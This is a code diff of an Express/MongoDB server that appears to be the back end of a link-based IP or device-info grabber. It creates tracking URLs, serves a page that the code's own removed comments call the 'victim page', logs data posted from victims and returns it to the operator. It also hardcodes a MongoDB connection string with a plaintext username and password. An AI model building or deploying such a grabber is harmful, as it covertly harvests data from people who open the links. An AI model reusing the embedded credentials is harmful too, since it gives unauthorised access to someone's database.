@@ -9,40 +9,22 @@ app.use(express.json());
 app.use(express.static('public'));
 
 const MONGO_URI = "mongodb+srv://darkgangdarks_db_user:aEEYR59YEVameS1y@cluster0.iyakwh0.mongodb.net/?appName=Cluster0";
-mongoose.connect(MONGO_URI).then(() => console.log("MongoDB Connected"));
+mongoose.connect(MONGO_URI).then(() => console.log("DB Connected"));
 
-// Database Schemas
-const userSchema = new mongoose.Schema({
-    name: String,
-    uid: String,
-    isBanned: { type: Boolean, default: false }
-});
-
-const logSchema = new mongoose.Schema({
-    uid: String,
-    data: Object,
-    timestamp: { type: Date, default: Date.now }
-});
-
-const customUrlSchema = new mongoose.Schema({
-    slug: String,
-    uid: String,
-    redirect: String
-});
+// Schemas
+const userSchema = new mongoose.Schema({ name: String, uid: String, isBanned: { type: Boolean, default: false } });
+const logSchema = new mongoose.Schema({ uid: String, data: Object, timestamp: { type: Date, default: Date.now } });
+const urlSchema = new mongoose.Schema({ slug: String, uid: String, type: String });
 
 const User = mongoose.model('User', userSchema);
 const Log = mongoose.model('Log', logSchema);
-const CustomUrl = mongoose.model('CustomUrl', customUrlSchema);
+const UrlStore = mongoose.model('UrlStore', urlSchema);
 
-// --- Render Self-Mood Active Code ---
 const SERVER_URL = "https://ipdx.onrender.com";
-setInterval(() => {
-    axios.get(`${SERVER_URL}/ping`).catch(() => {});
-}, 300000); // 10 minutes
-
+setInterval(() => { axios.get(`${SERVER_URL}/ping`).catch(() => {}); }, 300000);
 app.get('/ping', (req, res) => res.send("Active"));
 
-// Registration (11-character ID)
+// Register: 11-char ID
 app.post('/register', async (req, res) => {
     const uid = crypto.randomBytes(6).toString('hex').slice(0, 11);
     const newUser = new User({ name: req.body.name, uid: uid });
@@ -50,51 +32,35 @@ app.post('/register', async (req, res) => {
     res.json({ name: req.body.name, uid: uid });
 });
 
-// Create URL
 app.post('/create-url', async (req, res) => {
-    const { uid, custom, slug, redirect } = req.body;
-    const user = await User.findOne({ uid, isBanned: false });
-    if (!user) return res.status(403).json({ error: "Banned/Invalid" });
-
-    if (custom) {
-        const newUrl = new CustomUrl({ slug, uid, redirect });
-        await newUrl.save();
-        res.json({ url: `${SERVER_URL}/v/${slug}` });
-    } else {
-        res.json({ url: `${SERVER_URL}/v/random-${uid}` });
-    }
+    const { uid, isCustom, slug } = req.body;
+    const finalSlug = isCustom ? slug : `gen-${crypto.randomBytes(3).toString('hex')}`;
+    await UrlStore.create({ slug: finalSlug, uid, type: isCustom ? 'custom' : 'random' });
+    res.json({ url: `${SERVER_URL}/v/${finalSlug}` });
 });
 
-// Remove Custom URL on Exit
 app.post('/remove-custom', async (req, res) => {
-    await CustomUrl.deleteOne({ uid: req.body.uid });
+    await UrlStore.deleteMany({ uid: req.body.uid, type: 'custom' });
     res.json({ status: "Removed" });
 });
 
-// Log Data from Victim
 app.post('/log-data', async (req, res) => {
-    const newLog = new Log({ uid: req.body.uid, data: req.body.info });
-    await newLog.save();
+    await Log.create({ uid: req.body.uid, data: req.body.info });
     res.sendStatus(200);
 });
 
-// Get Logs for Bash Display
 app.get('/get-logs/:uid', async (req, res) => {
     const logs = await Log.find({ uid: req.params.uid }).sort({ timestamp: -1 }).limit(1);
     res.json(logs);
 });
 
-// Serve Victim Page
-app.get('/v/:slug', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'index.html'));
-});
+app.get('/v/:slug', (req, res) => { res.sendFile(path.join(__dirname, 'public', 'index.html')); });
 
-// Admin Routes
+// Admin
 app.get('/admin/users', async (req, res) => res.json(await User.find()));
 app.post('/admin/ban', async (req, res) => {
     await User.updateOne({ uid: req.body.uid }, { isBanned: true });
-    res.json({ msg: "Banned" });
+    res.json({ status: "Banned" });
 });
 
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Server: ${SERVER_URL}`));
+app.listen(process.env.PORT || 3000);
